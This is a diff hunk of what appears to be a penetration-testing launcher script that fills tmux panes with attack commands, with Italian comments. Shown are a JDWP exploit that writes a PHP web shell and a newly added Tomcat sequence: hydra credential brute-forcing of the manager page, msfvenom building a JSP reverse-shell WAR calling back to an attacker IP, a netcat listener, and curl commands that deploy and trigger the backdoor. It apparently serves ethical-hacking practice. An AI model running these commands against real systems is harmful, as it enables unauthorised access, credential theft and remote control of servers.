@@ -2892,6 +2892,32 @@ tmux send-keys -t PT:34.3 "# JWDP: RCE - Write file" Enter
 tmux send-keys -t PT:34.3 "sudo python2 /opt/jdwp-shellifier/jdwp-shellifier.py -t $ip --break-on \"java.lang.String.indexOf\" --cmd \"echo '<?php echo shell_exec($_GET[cmd]); ?>' > /var/www/html/shell.php\""
 cd $folderProject
 
+cd $folderProjectAuthN
+# Tomcat
+tmux new-window -t PT:35 -n '[8080, 8443] Tomcat'
+tmux split-window -v -t PT:35.0
+tmux split-window -v -t PT:35.1
+tmux select-pane -t "35.1"
+tmux split-window -h -t "35.1"
+tmux split-window -h -t "35.1"
+tmux split-window -h -t "35.1"
+tmux split-window -h -t "35.1"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:35.0 "# Tomcat: bruteforce" Enter
+tmux send-keys -t PT:35.0 "hydra -L users.txt -P passwords.txt -s 8080 -f $ip http-get /manager/html && hydra -L users.txt -P users.txt -s 8080 -f $ip http-get /manager/html && hydra -l '' -p '' -s 8080 -f $ip http-get /manager/html && hydra -l 'dontknow' -p '' -s 8080 -f $ip http-get /manager/html"
+tmux send-keys -t PT:35.1 "# Tomcat: Reverse Shell - create reverse shell" Enter
+tmux send-keys -t PT:35.1 "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=9001 -f war -o backdoor.war"
+tmux send-keys -t PT:35.2 "# Tomcat: Reverse Shell - activate listener" Enter
+tmux send-keys -t PT:35.2 "nc –nlvp 9001"
+tmux send-keys -t PT:35.3 "# Tomcat: Reverse Shell - upload reverse shell" Enter
+tmux send-keys -t PT:35.3 "curl -u 'USER:PASS' -X PUT -F \"file=@backdoor.war\" \"http://$ip:8080/manager/text/deploy?path=/backdoor\""
+tmux send-keys -t PT:35.4 "# Tomcat: Reverse Shell - upload reverse shell by means of Application Manager" Enter
+tmux send-keys -t PT:35.4 "# Tomcat: Reverse Shell - refer to Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025" Enter
+tmux send-keys -t PT:35.5 "# Tomcat: Reverse Shell - activare reverse shell" Enter
+tmux send-keys -t PT:35.5 "curl http://$ip:8080/backdoor/cfbrmtieqk.jsp"
+
+cd $folderProject
+
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 ;;
